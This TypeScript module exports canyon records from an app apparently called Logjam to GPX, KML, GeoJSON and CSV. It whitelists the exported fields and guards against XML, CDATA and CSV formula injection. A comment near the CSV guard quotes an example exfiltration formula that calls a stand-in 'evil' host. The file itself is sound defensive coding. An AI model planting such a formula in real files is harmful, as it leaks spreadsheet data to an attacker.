import Papa from "papaparse";
import type { TCanyon } from "./canyonUtils";

export type TExportFormat = "gpx" | "kml" | "geojson" | "csv";

// The user-meaningful canyon fields we are willing to put in an exported file.
// EXPORT-2: an explicit whitelist — NEVER spread the raw canyon record, which
// carries internal identifiers (ownerId, importBatchId, importKey, forkedFromId,
// ropeWikiSnapshot, _count, …) that must not leak into files users hand to third
// parties. These are exactly the columns of the CSV import template, so a GeoJSON
// or CSV export round-trips back through import. `name`, `latitude`, `longitude`
// are handled separately (name is the feature title; coords are the geometry).
const EXPORT_PROPERTY_KEYS = [
  "altNames",
  "vGrade",
  "aGrade",
  "commitment",
  "quality",
  "numAbseils",
  "longestAbseil",
  "hours",
  "notes",
] as const;

// User-authored extension data lives under canyon.attributes. Unlike the
// internal identifiers the whitelist excludes, `sources` (user-authored
// reference labels + URLs) and `customFields` (per-canyon custom-attribute
// values) ARE meant to round-trip — they are exactly what the CSV importer's
// `sources` role and `attr:<key>` roles re-ingest. Accessed through these two
// helpers so the null-guard lives in one place.
function canyonSources(c: TCanyon): [string, string][] {
  return c.attributes?.sources ?? [];
}

function canyonCustomFields(c: TCanyon): Record<string, unknown> {
  return c.attributes?.customFields ?? {};
}

// Build the whitelisted property object for a GeoJSON feature. Explicit
// assignment per key (no spread) so a future field added to TCanyon can't
// silently start leaking through the export. `sources` and `customFields` are
// the two allowed slices of `attributes` — see canyonSources/canyonCustomFields.
function exportProperties(c: TCanyon): Record<string, unknown> {
  return {
    name: c.name,
    altNames: c.altNames,
    vGrade: c.vGrade,
    aGrade: c.aGrade,
    commitment: c.commitment,
    quality: c.quality,
    numAbseils: c.numAbseils,
    longestAbseil: c.longestAbseil,
    hours: c.hours,
    notes: c.notes,
    // Self-describing {label, url} objects (friendlier to third parties than
    // the internal positional [label, url] tuples).
    sources: canyonSources(c).map(([label, url]) => ({ label, url })),
    // Raw key→value record of the canyon's custom-attribute values.
    customFields: canyonCustomFields(c),
  };
}

function escapeXml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}

// A `]]>` inside CDATA content ends the section early — the remainder is then
// parsed as XML markup, so unescaped user text (notes, altNames, sources; a
// canyon shared with the exporter carries the OWNER's text) can inject
// arbitrary elements into the exported KML (FECO-009). Split the terminator
// across two adjacent CDATA sections, which XML concatenates back into the
// literal text: the standard escape for "]]>" inside CDATA.
function escapeCdata(s: string): string {
  return s.replace(/\]\]>/g, "]]]]><![CDATA[>");
}

function descriptionText(c: TCanyon): string {
  const parts: string[] = [];
  if (c.altNames.length > 0) parts.push(`Also known as: ${c.altNames.join(", ")}`);
  if (c.vGrade != null) parts.push(`V-grade: ${c.vGrade}`);
  if (c.aGrade != null) parts.push(`A-grade: ${c.aGrade}`);
  if (c.commitment != null) parts.push(`Commitment: ${c.commitment}`);
  if (c.numAbseils != null) parts.push(`Abseils: ${c.numAbseils}`);
  if (c.longestAbseil != null) parts.push(`Longest abseil: ${c.longestAbseil}m`);
  if (c.hours != null) parts.push(`Duration: ${c.hours}h`);
  if (c.quality != null) parts.push(`Quality: ${c.quality}`);
  if (c.notes) parts.push(`Notes: ${c.notes}`);
  const sources = canyonSources(c);
  if (sources.length > 0) {
    parts.push(
      `Sources: ${sources
        .map(([label, url]) => (url ? `${label} (${url})` : label))
        .join(", ")}`,
    );
  }
  return parts.join("\n");
}

function filenameSlug(name: string): string {
  return name
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "");
}

function dateStamp(): string {
  return new Date().toISOString().slice(0, 10).replace(/-/g, "");
}

function buildFilename(canyons: TCanyon[], ext: string): string {
  if (canyons.length === 1) {
    return `logjam-${filenameSlug(canyons[0].name)}.${ext}`;
  }
  return `logjam-canyons-${dateStamp()}.${ext}`;
}

function canyonsToGpx(canyons: TCanyon[]): Blob {
  const wpts = canyons
    .map((c) => {
      const desc = descriptionText(c);
      return [
        `  <wpt lat="${c.latitude}" lon="${c.longitude}">`,
        `    <name>${escapeXml(c.name)}</name>`,
        desc ? `    <desc>${escapeXml(desc)}</desc>` : "",
        `    <time>${c.updatedAt}</time>`,
        `  </wpt>`,
      ]
        .filter(Boolean)
        .join("\n");
    })
    .join("\n");

  const xml = [
    `<?xml version="1.0" encoding="UTF-8"?>`,
    `<gpx version="1.1" creator="Logjam" xmlns="http://www.topografix.com/GPX/1/1">`,
    wpts,
    `</gpx>`,
  ].join("\n");

  return new Blob([xml], { type: "application/gpx+xml" });
}

function canyonsToKml(canyons: TCanyon[]): Blob {
  const placemarks = canyons
    .map((c) => {
      const desc = descriptionText(c);
      return [
        `  <Placemark>`,
        `    <name>${escapeXml(c.name)}</name>`,
        desc ? `    <description><![CDATA[${escapeCdata(desc)}]]></description>` : "",
        `    <Point><coordinates>${c.longitude},${c.latitude},0</coordinates></Point>`,
        `  </Placemark>`,
      ]
        .filter(Boolean)
        .join("\n");
    })
    .join("\n");

  const xml = [
    `<?xml version="1.0" encoding="UTF-8"?>`,
    `<kml xmlns="http://www.opengis.net/kml/2.2">`,
    `<Document>`,
    placemarks,
    `</Document>`,
    `</kml>`,
  ].join("\n");

  return new Blob([xml], { type: "application/vnd.google-earth.kml+xml" });
}

function canyonsToGeoJson(canyons: TCanyon[]): Blob {
  const features = canyons.map((c) => ({
    type: "Feature",
    geometry: { type: "Point", coordinates: [c.longitude, c.latitude] },
    // Whitelisted properties only — see exportProperties / EXPORT_PROPERTY_KEYS.
    properties: exportProperties(c),
  }));

  const collection = { type: "FeatureCollection", features };
  return new Blob([JSON.stringify(collection, null, 2)], {
    type: "application/geo+json",
  });
}

// Fixed CSV columns, in the exact order of the import template
// (frontend/public/templates/canyon-import-template.csv) so an export can be
// re-imported unchanged, followed by `sources`. altNames serialise
// semicolon-separated, matching the template's "Alt Name 1; Alt Name 2"
// convention and parseAltNames on import. Custom-field (`attr:<key>`) columns
// are appended dynamically per exported set — see canyonsToCsv.
const CSV_COLUMNS = [
  "name",
  "latitude",
  "longitude",
  ...EXPORT_PROPERTY_KEYS,
  "sources",
] as const;

// Excel/LibreOffice/Sheets treat a cell starting with =, +, -, @ (or a tab/CR
// that a formula scanner skips past) as a formula to evaluate on open — CSV
// injection. A canyon name/notes/custom-field value like
// `=WEBSERVICE("https://evil/?d="&A1)` survives Papa.unparse's quoting
// unmodified and executes for whoever opens the file (FECO-010; the
// cross-user path is real — a sharee can export the owner's notes). Prefix a
// `'` so spreadsheet apps render it as inert text; Papa.unparse still quotes
// the cell as needed around that prefix.
//
// Only applied to free-text columns (below), NOT to latitude/longitude/the
// numeric grade columns: those are always `String(number)` — a negative
// coordinate ("-33.5") is a valid numeric literal spreadsheet software parses
// as a number rather than evaluating as a formula, and prefixing it would
// corrupt the app's own CSV round-trip (parseLatLng on re-import).
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

// Columns whose cells can carry arbitrary user-authored text (as opposed to
// the app's own numeric formatting) — the formula-injection guard applies
// only to these (FECO-010).
const CSV_TEXT_COLUMNS = new Set<(typeof CSV_COLUMNS)[number]>([
  "name",
  "altNames",
  "notes",
  "sources",
]);

function csvCell(c: TCanyon, column: (typeof CSV_COLUMNS)[number]): string {
  switch (column) {
    case "name":
      return c.name;
    case "latitude":
      return String(c.latitude);
    case "longitude":
      return String(c.longitude);
    case "altNames":
      return c.altNames.join("; ");
    case "notes":
      return c.notes ?? "";
    case "sources": {
      // Serialised as the JSON [[label, url], …] form that parseSources
      // round-trips losslessly (a "; " token join can't preserve a
      // user-authored label on a URL source). Empty cell when there are none.
      const sources = canyonSources(c);
      return sources.length > 0 ? JSON.stringify(sources) : "";
    }
    default: {
      // The remaining columns are nullable numbers; empty string for null so the
      // cell round-trips to "no value" rather than the literal "null".
      const value = c[column];
      return value == null ? "" : String(value);
    }
  }
}

// Every custom-field key present across the exported set, sorted for a stable
// column order. Each becomes an `attr:<key>` column the CSV importer auto-maps
// straight back to the matching custom-field role (see detectCanyonColumns).
function collectCustomFieldKeys(canyons: TCanyon[]): string[] {
  const keys = new Set<string>();
  for (const c of canyons) {
    for (const key of Object.keys(canyonCustomFields(c))) keys.add(key);
  }
  return [...keys].sort();
}

function canyonsToCsv(canyons: TCanyon[]): Blob {
  const attrKeys = collectCustomFieldKeys(canyons);
  const attrColumns = attrKeys.map((key) => `attr:${key}`);
  const fields = [...CSV_COLUMNS, ...attrColumns];
  // Papa.unparse handles CSV escaping (quotes, commas, newlines in notes) — the
  // symmetric counterpart to parseCsv's Papa.parse on import.
  const rows = canyons.map((c) => {
    const customFields = canyonCustomFields(c);
    const row: Record<string, string> = {};
    for (const column of CSV_COLUMNS) {
      const cell = csvCell(c, column);
      row[column] = CSV_TEXT_COLUMNS.has(column) ? neutralizeFormula(cell) : cell;
    }
    for (const key of attrKeys) {
      // Empty cell for canyons lacking the field; String() for present values
      // (custom-field values re-ingest as strings via the `attr:<key>` role).
      // Custom-field values are free-form user text — formula-injection guard
      // applies here too (FECO-010).
      const value = customFields[key];
      row[`attr:${key}`] = value == null ? "" : neutralizeFormula(String(value));
    }
    return row;
  });
  const csv = Papa.unparse({ fields, data: rows });
  return new Blob([csv], { type: "text/csv" });
}

export function buildCanyonExport(
  canyons: TCanyon[],
  format: TExportFormat,
): { blob: Blob; filename: string } {
  switch (format) {
    case "gpx":
      return { blob: canyonsToGpx(canyons), filename: buildFilename(canyons, "gpx") };
    case "kml":
      return { blob: canyonsToKml(canyons), filename: buildFilename(canyons, "kml") };
    case "geojson":
      return { blob: canyonsToGeoJson(canyons), filename: buildFilename(canyons, "geojson") };
    case "csv":
      return { blob: canyonsToCsv(canyons), filename: buildFilename(canyons, "csv") };
  }
}
